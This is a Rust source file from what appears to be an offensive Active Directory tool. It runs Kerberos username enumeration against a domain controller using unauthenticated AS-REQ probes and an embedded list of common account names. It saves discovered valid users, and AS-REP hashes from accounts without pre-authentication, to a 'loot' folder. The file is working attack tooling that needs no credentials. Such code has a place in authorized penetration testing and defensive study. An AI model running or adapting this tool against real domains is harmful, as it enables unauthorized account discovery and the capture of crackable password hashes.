//! Kerberos Username Enumeration — Zero-knowledge user discovery via AS-REQ probes.
//!
//! Sends AS-REQ without pre-authentication data for each candidate username.
//! The KDC error code reveals whether the account exists:
//! - `KDC_ERR_C_PRINCIPAL_UNKNOWN` (6)  → user does NOT exist
//! - `KDC_ERR_PREAUTH_REQUIRED` (25)    → user EXISTS
//! - Full AS-REP                        → user EXISTS + no pre-auth (hash auto-captured)
//!
//! This is the #1 technique for zero-knowledge AD engagements — no credentials required.

use colored::Colorize;
use indicatif::{ProgressBar, ProgressStyle};
use overthrone_core::checkpoint::Checkpoint;
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::kerberos::{self, UserEnumStatus};
use serde::{Deserialize, Serialize};
use std::io::ErrorKind;
use std::path::{Path, PathBuf};
use tracing::{debug, info, warn};

// ═══════════════════════════════════════════════════════════
// Configuration
// ═══════════════════════════════════════════════════════════

const EMBEDDED_USERLIST: &str = r#"# Common AD usernames and service accounts
administrator
admin
adm
root
krbtgt
guest
test
user
user1
user2
backup
backups
helpdesk
support
it
itadmin
sysadmin
sysadm
administrator1
administrator2
svc
service
svc_backup
svc_sql
svc_mssql
svc_exchange
svc_adfs
svc_sccm
svc_dns
svc_dhcp
svc_web
svc_http
sql
sqlsvc
mssql
mssqlsvc
db
dbsvc
web
websvc
iis
http
smtp
ftp
dns
dhcp
adfs
aadconnect
sync
sccm
wds
print
printer
filesvc
fileserver
sharepoint
spfarm
spadmin
spservice
ldap
rdp
vpn
vmware
vcenter
citrix
monitor
nagios
zabbix
backupsvc
ops
dev
devops
qa
stage
prod
hr
finance
accounting
payroll
legal
security
secops
soc
audit
ceo
cfo
cio
cto
manager
mgr
admin1
admin2
john
jane
jdoe
jsmith
asmith
bsmith
mjones
sjohnson
david
michael
mike
sarah
susan
daniel
dan
alex
rob
robert
kevin
mark
matt
paul
linda
mary
maria
ann
anne
"#;
/// Structure
#[derive(Debug, Clone)]
pub struct UserEnumConfig {
    /// Path to username wordlist (one per line)
    pub userlist: PathBuf,
    /// Output file for valid usernames
    pub output_file: Option<PathBuf>,
    /// Also save AS-REP hashes for no-preauth accounts
    pub save_asrep_hashes: bool,
    /// Maximum concurrent Kerberos probes
    pub concurrency: usize,
    /// Use LDAP for additional user attributes (enriches enumeration)
    pub use_ldap: bool,
    /// Path to checkpoint file for resume (empty = no checkpoint)
    pub checkpoint_path: Option<PathBuf>,
    /// Resume from checkpoint if available
    pub resume: bool,
    /// Show live output as users are found
    pub live_output: bool,
}

impl Default for UserEnumConfig {
    fn default() -> Self {
        Self {
            userlist: PathBuf::new(),
            output_file: None,
            save_asrep_hashes: true,
            concurrency: 10,
            use_ldap: false,
            checkpoint_path: None,
            resume: false,
            live_output: true,
        }
    }
}

fn parse_userlist(content: &str) -> Vec<String> {
    content
        .lines()
        .map(|line| line.trim())
        .filter(|line| !line.is_empty() && !line.starts_with('#'))
        .map(|line| line.to_string())
        .collect()
}

pub fn embedded_usernames() -> Vec<String> {
    parse_userlist(EMBEDDED_USERLIST)
}

async fn load_usernames(userlist_path: &Path) -> Result<(Vec<String>, String)> {
    if userlist_path.as_os_str().is_empty() {
        return Ok((embedded_usernames(), "embedded fallback list".to_string()));
    }

    match tokio::fs::read_to_string(userlist_path).await {
        Ok(content) => Ok((
            parse_userlist(&content),
            userlist_path.display().to_string(),
        )),
        Err(e) if e.kind() == ErrorKind::NotFound => {
            warn!(
                "Cannot read userlist {}: {}. Falling back to embedded list.",
                userlist_path.display(),
                e
            );
            Ok((embedded_usernames(), "embedded fallback list".to_string()))
        }
        Err(e) => Err(OverthroneError::Custom(format!(
            "Cannot read userlist {}: {}",
            userlist_path.display(),
            e
        ))),
    }
}

// ═══════════════════════════════════════════════════════════
// Result
// ═══════════════════════════════════════════════════════════
/// Structure
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UserEnumResult {
    /// Valid usernames discovered (pre-auth required)
    pub valid_users: Vec<String>,
    /// Valid usernames with no pre-auth + captured AS-REP hash
    pub no_preauth_users: Vec<AsRepCapture>,
    /// Disabled accounts discovered
    pub disabled_users: Vec<String>,
    /// Total usernames tested
    pub total_tested: usize,
    /// Usernames that were not found
    pub not_found: usize,
    /// Errors during enumeration
    pub errors: Vec<(String, String)>,
}
/// Structure
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AsRepCapture {
    /// Username for authentication
    pub username: String,
    /// Hash value
    pub hash_string: String,
}

// ═══════════════════════════════════════════════════════════
// Public Runner
// ═══════════════════════════════════════════════════════════

/// Run Kerberos username enumeration against the target DC.
/// No credentials required — uses only AS-REQ error code analysis.
///
/// Supports checkpoint/resume: when `uc.resume` is true, loads existing checkpoint
/// and skips already-processed users. Processes in chunks for periodic checkpointing.
/// Live output prints valid/disabled/preauth users immediately as discovered.
pub async fn run(
    dc_ip: &str,
    domain: &str,
    uc: &UserEnumConfig,
    _jitter_ms: u64,
) -> Result<UserEnumResult> {
    info!("{}", "═══ KERBEROS USER ENUMERATION ═══".bold().magenta());

    // Load username wordlist (fallback to embedded list if default is missing)
    let (usernames, source) = load_usernames(&uc.userlist).await?;

    if usernames.is_empty() {
        warn!("Userlist is empty: {}", source);
        return Ok(UserEnumResult {
            valid_users: Vec::new(),
            no_preauth_users: Vec::new(),
            disabled_users: Vec::new(),
            total_tested: 0,
            not_found: 0,
            errors: Vec::new(),
        });
    }

    info!(
        "Loaded {} candidate usernames from {}",
        usernames.len(),
        source
    );

    // ── Checkpoint setup ──────────────────────────────────────────
    let ckpt_path = uc.checkpoint_path.clone().unwrap_or_else(|| {
        overthrone_core::checkpoint::checkpoint_path(None, "user-enum", domain, dc_ip)
    });
    let resume = uc.resume && ckpt_path.exists();
    if resume {
        info!("Resuming from checkpoint: {}", ckpt_path.display());
    }
    let mut ckpt = Checkpoint::load_or_new(&ckpt_path, "user-enum", dc_ip, domain, usernames.len());

    // Determine which users still need processing
    let to_process: Vec<&str> = if resume {
        let pending = ckpt.pending(&usernames);
        if pending.is_empty() {
            info!("All users already processed in prior session — reusing results.");
        } else {
            info!(
                "{} users remain, skipping {} already processed",
                pending.len(),
                usernames.len() - pending.len()
            );
        }
        pending
    } else {
        usernames.iter().map(|s| s.as_str()).collect()
    };

    // ── Progress bar ───────────────────────────────────────────────
    let pb = ProgressBar::new(usernames.len() as u64);
    pb.set_style(
        ProgressStyle::default_bar()
            .template("{spinner:.yellow} [{bar:40.cyan/dim}] {pos}/{len} user-enum {msg}")
            .unwrap_or_else(|e| {
                warn!("Progress bar template error: {e}");
                ProgressStyle::default_bar()
            })
            .progress_chars("█▓░"),
    );
    pb.set_position(ckpt.processed_count() as u64);

    // ── Process in chunks ──────────────────────────────────────────
    const CHUNK_SIZE: usize = 50;
    let mut valid_users: Vec<String> = Vec::new();
    let mut no_preauth_users: Vec<AsRepCapture> = Vec::new();
    let mut disabled_users: Vec<String> = Vec::new();
    let mut not_found: usize = 0;
    let mut errors: Vec<(String, String)> = Vec::new();

    // Restore previously found results from checkpoint
    for entry in ckpt.results() {
        match entry.status.as_str() {
            "valid" => valid_users.push(entry.item.clone()),
            "no_preauth" => {
                valid_users.push(entry.item.clone());
                no_preauth_users.push(AsRepCapture {
                    username: entry.item.clone(),
                    hash_string: entry.detail.clone().unwrap_or_default(),
                });
            }
            "disabled" => disabled_users.push(entry.item.clone()),
            "not_found" => not_found += 1,
            _ => {}
        }
    }

    for chunk in to_process.chunks(CHUNK_SIZE) {
        let chunk_owned: Vec<String> = chunk.iter().map(|s| (*s).to_string()).collect();
        let results = kerberos::user_enum_batch(dc_ip, domain, &chunk_owned).await;

        for (username, status) in &results {
            pb.set_message(username.clone());

            match status {
                UserEnumStatus::Valid => {
                    valid_users.push(username.clone());
                    ckpt.record(username, "valid", None);
                    if uc.live_output {
                        println!(
                            "  {} {} — {}",
                            "✓".green(),
                            username.bold().green(),
                            "VALID".green()
                        );
                    }
                }
                UserEnumStatus::ValidNoPreauth(hash) => {
                    valid_users.push(username.clone());
                    let hash_str = hash.hash_string.clone();
                    no_preauth_users.push(AsRepCapture {
                        username: username.clone(),
                        hash_string: hash_str.clone(),
                    });
                    ckpt.record(username, "no_preauth", Some(hash_str.clone()));
                    if uc.live_output {
                        println!(
                            "  {} {} — {} (hash captured)",
                            "★".bright_yellow(),
                            username.bold().bright_yellow(),
                            "VALID + NO PREAUTH".bright_yellow()
                        );
                    }
                }
                UserEnumStatus::Disabled => {
                    disabled_users.push(username.clone());
                    ckpt.record(username, "disabled", None);
                    if uc.live_output {
                        println!(
                            "  {} {} — {}",
                            "⚠".yellow(),
                            username.bold().yellow(),
                            "DISABLED".yellow()
                        );
                    }
                }
                UserEnumStatus::NotFound => {
                    ckpt.record(username, "not_found", None);
                    not_found += 1;
                }
                UserEnumStatus::Error(e) => {
                    ckpt.record(username, "error", Some(e.clone()));
                    errors.push((username.clone(), e.clone()));
                }
            }

            pb.inc(1);
        }

        // Save checkpoint after each chunk
        ckpt.save();
    }

    pb.finish_with_message("done");
    ckpt.save();

    // ── Save results ───────────────────────────────────────────────
    let loot_dir = PathBuf::from("./loot");
    let _ = tokio::fs::create_dir_all(&loot_dir).await;

    let output_path = uc
        .output_file
        .clone()
        .unwrap_or_else(|| loot_dir.join("valid_users.txt"));
    let mut all_valid: Vec<String> = valid_users.clone();
    all_valid.extend(disabled_users.iter().cloned());
    if !all_valid.is_empty() {
        let user_lines = all_valid.join("\n");
        tokio::fs::write(&output_path, &user_lines).await?;
        info!(
            "Saved {} valid usernames to {}",
            all_valid.len(),
            output_path.display()
        );
    }

    if uc.save_asrep_hashes && !no_preauth_users.is_empty() {
        let hash_path = loot_dir.join("userenum_asrep_hashes.txt");
        let hash_lines: String = no_preauth_users
            .iter()
            .map(|h| h.hash_string.as_str())
            .collect::<Vec<_>>()
            .join("\n");
        tokio::fs::write(&hash_path, &hash_lines).await?;
        info!(
            "Saved {} AS-REP hashes to {}",
            no_preauth_users.len(),
            hash_path.display()
        );
    }

    // Clean up checkpoint on successful completion
    if std::fs::remove_file(&ckpt_path).is_ok() {
        debug!("Checkpoint file removed after successful completion");
    }

    // ── Summary ────────────────────────────────────────────────────
    println!("\n{}", "═══ USER ENUMERATION RESULTS ═══".bold().cyan());
    println!(
        "  {} Valid users:       {}",
        "✓".green(),
        valid_users.len().to_string().bold().green()
    );
    if !no_preauth_users.is_empty() {
        println!(
            "  {} No pre-auth (hash): {}",
            "★".bright_yellow(),
            no_preauth_users.len().to_string().bold().bright_yellow()
        );
    }
    if !disabled_users.is_empty() {
        println!(
            "  {} Disabled accounts:  {}",
            "⚠".yellow(),
            disabled_users.len().to_string().bold()
        );
    }
    println!("  {} Not found:         {}", "✗".dimmed(), not_found);
    println!("  {} Total tested:      {}", "→".cyan(), usernames.len());
    if !errors.is_empty() {
        println!("  {} Errors:            {}", "⚠".red(), errors.len());
    }
    println!("{}\n", "════════════════════════════════".cyan());

    Ok(UserEnumResult {
        valid_users,
        no_preauth_users,
        disabled_users,
        total_tested: usernames.len(),
        not_found,
        errors,
    })
}
